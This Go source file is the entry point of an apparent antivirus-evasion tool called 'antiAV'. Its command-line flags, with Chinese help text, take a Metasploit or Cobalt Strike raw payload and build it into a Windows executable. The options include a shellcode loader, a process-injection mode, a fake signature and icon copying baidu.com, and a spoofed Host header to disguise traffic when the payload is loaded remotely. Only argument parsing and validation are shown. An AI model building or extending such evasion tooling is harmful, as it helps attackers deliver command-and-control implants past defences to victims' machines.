package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/sirupsen/logrus"
)

var (
	antiAV = config{}
)

func main() {
	initialize()
	antiAV.build()
}

func initialize() {
	flag.StringVar(&antiAV.os, "os", "windows", "OS: windows,linux")
	flag.StringVar(&antiAV.loader, "l", "sc", "支持的加载类型: sc")
	flag.StringVar(&antiAV.paylaod, "p", "payload.bin", "msf/cs raw payload")
	flag.StringVar(&antiAV.valid, "v", "baidu.com", "签名: baidu.com")
	flag.StringVar(&antiAV.hostObfuscator, "ho", "wwww.baidu.com", "远程加载payload.raw时,在GET请求头中替换host实现流量混淆")
	flag.StringVar(&antiAV.arch, "arch", "386", "生成文件格式amd64,386")
	flag.StringVar(&antiAV.output, "o", "output.exe", "输出文件名字")
	flag.BoolVar(&antiAV.genRaw, "r", false, `生成payload.raw`)
	flag.StringVar(&antiAV.mode, "mode", "normal", "支持normal,inject")
	flag.BoolVar(&antiAV.noIcon, "no-icon", false, "关闭签名")
	flag.Parse()

	if err := antiAV.validate(); err != nil {
		logrus.Error("[-]", err.Error())
		os.Exit(0)
	}

	logrus.SetFormatter(&logrus.TextFormatter{
		DisableColors:          false,
		DisableTimestamp:       true,
		FullTimestamp:          false,
		DisableLevelTruncation: false,
	})

}

func (c *config) validate() error {
	switch c.loader {
	case "sc":
		fallthrough
	case "pe":
	default:
		return fmt.Errorf("不支持的加载器类型: %v", c.loader)
	}
	switch c.os {
	case "windows":
	default:
		return fmt.Errorf("不支持的操作系统: %v", c.os)
	}

	return nil
}
